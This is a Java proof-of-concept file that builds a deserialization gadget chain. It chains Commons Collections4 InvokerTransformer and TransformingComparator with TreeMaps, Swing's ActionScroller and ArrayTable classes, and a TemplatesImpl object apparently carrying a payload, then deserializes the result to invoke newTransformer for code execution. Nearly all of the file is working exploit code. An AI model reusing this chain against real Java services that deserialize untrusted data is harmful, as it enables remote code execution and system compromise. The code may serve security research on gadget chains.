package com.example.CC4;

import com.example.Utils.ReflectionUtil;
import com.example.Utils.SerializeUtil;
import com.example.Utils.Share;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

import javax.swing.event.SwingPropertyChangeSupport;
import java.util.TreeMap;

public class POC_11 {

    /***
     * run with action_equals.jar
     */

    public static void main(String[] args) throws Exception {
        TemplatesImpl templates = Share.getTemplatesImplObj();

        Transformer transformer = new InvokerTransformer("toString", new Class[]{}, new Object[]{});
        TransformingComparator comparator  = new TransformingComparator(transformer);

        TreeMap treeMap1 = new TreeMap(comparator);
        treeMap1.put(templates, "aaa");
        TreeMap treeMap2 = new TreeMap(comparator);
        treeMap2.put(templates, "aaa");

        ReflectionUtil.setField(transformer, "iMethodName", "newTransformer");
        Object action = ReflectionUtil.createWithoutConstructor(Class.forName("javax.swing.plaf.basic.BasicSliderUI$ActionScroller"));
        Object arrayTable = ReflectionUtil.createWithoutConstructor(Class.forName("javax.swing.ArrayTable"));
        Object[] table = new Object[]{"key", treeMap1, "key", treeMap2};

        ReflectionUtil.setField(arrayTable, "table", table);
        SwingPropertyChangeSupport changeSupport = new SwingPropertyChangeSupport("bean");
        ReflectionUtil.setField(action, "arrayTable", arrayTable);
        ReflectionUtil.setField(action, "changeSupport", changeSupport);

        SerializeUtil.deserialize(SerializeUtil.serialize(action));
    }

}
